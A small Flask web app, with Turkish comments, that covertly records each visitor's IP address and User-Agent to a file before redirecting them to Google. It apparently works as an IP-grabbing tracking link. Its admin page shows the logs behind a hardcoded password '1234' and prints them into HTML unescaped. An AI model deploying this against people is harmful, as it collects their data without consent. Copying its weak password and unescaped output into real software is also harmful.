from flask import Flask, request, redirect
from datetime import datetime

app = Flask(__name__)

ADMIN_PASSWORD = "1234"

@app.route("/")
def index():
    ip = request.remote_addr
    ua = request.headers.get("User-Agent")
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open("log.txt", "a") as f:
        f.write(f"{time} | IP: {ip} | UA: {ua}\n")

    return redirect("https://www.google.com")  # Siteye girenler Google'a yönlendirilir

@app.route("/admin", methods=["GET", "POST"])
def admin():
    if request.method == "POST":
        password = request.form.get("password")
        if password == ADMIN_PASSWORD:
            with open("log.txt", "r") as f:
                logs = f.readlines()
            return "<h1>Loglar:</h1><pre>" + "".join(logs) + "</pre>"
        return "<h1>Yanlış şifre!</h1>"

    return '''
    <form method="POST">
        <input type="password" name="password" placeholder="Şifre">
        <button type="submit">Giriş</button>
    </form>
    '''

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
